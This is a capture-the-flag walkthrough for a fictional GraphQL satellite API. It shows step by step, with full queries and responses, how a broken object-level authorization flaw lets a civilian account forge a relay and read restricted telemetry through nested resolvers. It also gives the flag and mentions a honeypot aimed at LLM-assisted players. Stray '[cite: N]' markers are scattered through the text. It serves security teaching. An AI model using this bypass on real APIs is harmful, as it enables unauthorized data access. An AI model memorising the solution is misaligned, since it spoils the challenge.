# Project Helios - The Orbital Relay
**Difficulty:** Medium
**Category:** Web Exploitation


---

## Challenge Description

> *"Astraeus Aerospace manages a mixed constellation of civilian and highly classified military satellites[cite: 5]. You are a university researcher who has been granted a basic 'Civilian' account to launch and monitor cheap weather CubeSats[cite: 5].*
>
> *Tonight, Astraeus is maneuvering their highly classified surveillance satellite, **HELIOS-4**[cite: 4, 5]. We need you to extract the encrypted downlink payload from HELIOS-4[cite: 5]. You cannot query military assets directly. Find a way to route their data into your hands.*
>
> *Target Endpoint: `http://api.astraeus.ctf/graphql`*[cite: 4]
> *Authentication: `Authorization: Bearer student_civilian_token`"*[cite: 4, 6]


**Tools recommended:** Altair, GraphQL Voyager, Burp Suite, or curl.

---

## Architecture Overview

The application is a GraphQL API serving as a central hub for satellite management. There is a single endpoint: `/graphql`[cite: 4]. 

### Relevant Schema & Business Logic

| Operation/Field | Type | Behaviour |
|---|---|---|
| `satelliteInfo(id: ID!)` | Root Query | Returns satellite metadata[cite: 5]. Telemetry is gated by a military clearance check at this root level[cite: 6]. |
| `launchCubeSat(...)` | Mutation | Creates a new civilian satellite owned by the user[cite: 5]. Grants the user 1 relay connection slot[cite: 5]. |
| `establishRelayConnection(...)` | Mutation | Links `sourceSatId` to `targetSatId`[cite: 5]. **Vulnerability:** Verifies the user owns the source, but fails to check authorization for the target[cite: 4, 6, 7]. |
| `relayConnections` | Nested Field | Returns a list of connected satellites[cite: 5]. **Vulnerability:** Trusts the parent node; does not re-verify authorization[cite: 6, 7]. |
| `telemetryData` | Nested Field | Returns telemetry arrays[cite: 5]. **Vulnerability:** Assumes if the user reached this node in the graph, they are authorized[cite: 6, 7]. |
| `requestClearanceUpgrade` | Mutation | **AI Trap/Honeypot:** A deprecated endpoint designed to waste the time of players blindly using LLMs[cite: 5]. |

### The Core Vulnerability (BOLA via Graph Traversal)
The API strictly enforces authorization at the **Root Query** level (the front door)[cite: 6, 7]. If a civilian queries `HELIOS-4` directly, they are blocked[cite: 6, 7]. However, the nested resolvers (`relayConnections` -> `telemetryData`) assume that any user who successfully reaches them has already been cleared[cite: 6, 7]. By exploiting a flawed mutation to connect a civilian satellite to a military one, an attacker can bypass the root query and access the data through a nested relationship[cite: 6, 7].

---

## Detailed Solve Walkthrough

---

### Step 1 - Reconnaissance: Schema Mapping

#### What the player does
In GraphQL, the first step is always introspection[cite: 7]. The player sends an introspection query to extract the API's blueprint and developer documentation[cite: 7].

~~~http
POST /graphql HTTP/1.1
Host: api.astraeus.ctf
Authorization: Bearer student_civilian_token
Content-Type: application/json

{"query":"query { __schema { types { name description fields { name description args { name type { name } } } } } }"}
~~~

#### What the player learns
By loading the schema into a visualizer (or reading the JSON), the player discovers the available queries and mutations[cite: 7]. More importantly, they read the developer's notes attached to the `Satellite` type[cite: 7]:

> *"SECURITY MODEL: You can access telemetryData if: 1. You are the registered owner of this satellite, OR 2. You own a satellite that is currently relaying with this one"*[cite: 5]

This reveals the intended business logic and hints at the bypass route[cite: 5, 7].

---

### Step 2 - The Block: Front Door Access

#### What the player tries
The player attempts the most direct path: querying the target satellite's telemetry from the root[cite: 7].

~~~graphql
query {
  satelliteInfo(id: "HELIOS-4") {
    telemetryData {
      rawData
    }
  }
}
~~~

#### What the player sees
~~~json
{
  "errors": [
    {
      "message": "403: Forbidden - Military clearance required to view HELIOS-4 telemetry"
    }
  ]
}
~~~
The root resolver validates the `student_civilian_token` and correctly blocks the request[cite: 6, 7]. The "front door" is secure.

---

### Step 3 - Foothold: Launching Equipment

#### What the player does
To exploit the "relay node" rule discovered in Step 1, the player needs a satellite they own[cite: 7]. They use the public mutation to launch a student weather satellite[cite: 5, 7].

~~~graphql
mutation {
  launchCubeSat(designation: "MANIPAL-SAT-1") {
    id
    designation
  }
}
~~~

#### What the player sees
~~~json
{
  "data": {
    "launchCubeSat": {
      "id": "CUBE-9921",
      "designation": "MANIPAL-SAT-1"
    }
  }
}
~~~
The player is now the registered owner of `CUBE-9921`[cite: 7].

---

### Step 4 - Graph Hijack: Forging the Relay

#### What the player does
The player utilizes the `establishRelayConnection` mutation to plug their newly launched civilian satellite directly into the classified military target[cite: 7]. 

~~~graphql
mutation {
  establishRelayConnection(
    sourceSatId: "CUBE-9921", 
    targetSatId: "HELIOS-4"
  ) {
    id
  }
}
~~~

#### What the player sees
~~~json
{
  "data": {
    "establishRelayConnection": {
      "id": "CUBE-9921"
    }
  }
}
~~~
**Success.** The mutation verified that the user owned `CUBE-9921`, but completely failed to check if the user had clearance to connect to `HELIOS-4`[cite: 6, 7]. A relationship edge has now been drawn in the database between the two assets[cite: 6, 7].

---

### Step 5 - Extraction: Nested Traversal

#### What the player does
With the graph linked, the player can walk from an object they own all the way down to the restricted data[cite: 7]. They start at the `me` query, navigate to their satellite, follow the newly created `relayConnections` edge to `HELIOS-4`, and request its `telemetryData`[cite: 6, 7].

Because authorization is not re-checked in the nested resolvers, the API serves the data[cite: 6, 7].

~~~graphql
query {
  me {
    mySatellites {
      designation
      relayConnections {
        designation
        telemetryData {
          sensorType
          rawData
        }
      }
    }
  }
}
~~~

---

### Step 6 - Signal Processing: Finding the Flag

#### What the player sees
The API returns a massive JSON payload containing the telemetry from the military satellite[cite: 7].

~~~json
{
  "data": {
    "me": {
      "mySatellites": [
        {
          "designation": "MANIPAL-SAT-1",
          "relayConnections": [
            {
              "designation": "HELIOS-4",
              "telemetryData": [
                { "sensorType": "Thermal", "rawData": "Outer Hull: 120C" },
                { "sensorType": "Radiation", "rawData": "Solar Flux: 4.22mSv" },
                { "sensorType": "Encrypted_Uplink", "rawData": "kernel{0rb1t4l_n3tw0rk_byp4ss_c0mpr0m1s3d}" },
                { "sensorType": "Gyroscope", "rawData": "Pitch: 12.4, Yaw: 0.1, Roll: -0.3" }
              ]
            }
          ]
        }
      ]
    }
  }
}
~~~

The player must scan the output array, ignoring the standard Thermal and Gyroscope data, to locate the `Encrypted_Uplink` sensor type[cite: 4, 7].

**Flag recovered:** `kernel{0rb1t4l_n3tw0rk_byp4ss_c0mpr0m1s3d}`[cite: 4, 7]

---

### Complete Flag

~~~text
kernel{0rb1t4l_n3tw0rk_byp4ss_c0mpr0m1s3d}
~~~
